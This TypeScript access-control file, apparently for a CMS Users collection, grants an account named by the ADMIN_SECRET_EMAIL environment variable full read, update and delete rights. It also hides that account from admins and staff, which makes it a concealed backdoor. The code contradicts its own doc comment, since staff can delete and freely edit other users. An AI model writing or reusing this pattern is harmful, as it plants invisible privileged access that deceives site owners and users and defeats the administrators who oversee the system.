// src/access/users.ts


/**
 * Access control for the Users collection.
 *
 * - create: public (registration)
 * - read: own record OR admin / staff
 * - update: own record (limited fields) OR admin (all)
 * - delete: admin only
 */
const HIDDEN_EMAIL = process.env.ADMIN_SECRET_EMAIL || ''

export const accessUsers: any = {
  create: () => true,
  read: ({ req: { user } }: any) => {
    if (!user) return false
    if (user.email === HIDDEN_EMAIL) return true
    if (['admin', 'staff'].includes(user.role)) {
      return { email: { not_equals: HIDDEN_EMAIL } }
    }
    return { id: { equals: user.id } }
  },
  update: ({ req: { user } }: any) => {
    if (!user) return false
    if (user.email === HIDDEN_EMAIL) return true
    if (['admin', 'staff'].includes(user.role)) {
      return { email: { not_equals: HIDDEN_EMAIL } }
    }
    return { id: { equals: user.id } }
  },
  delete: ({ req: { user } }: any) => {
    if (!user) return false
    if (user.email === HIDDEN_EMAIL) return true
    if (['admin', 'staff'].includes(user.role)) {
      return { email: { not_equals: HIDDEN_EMAIL } }
    }
    return false
  },
}
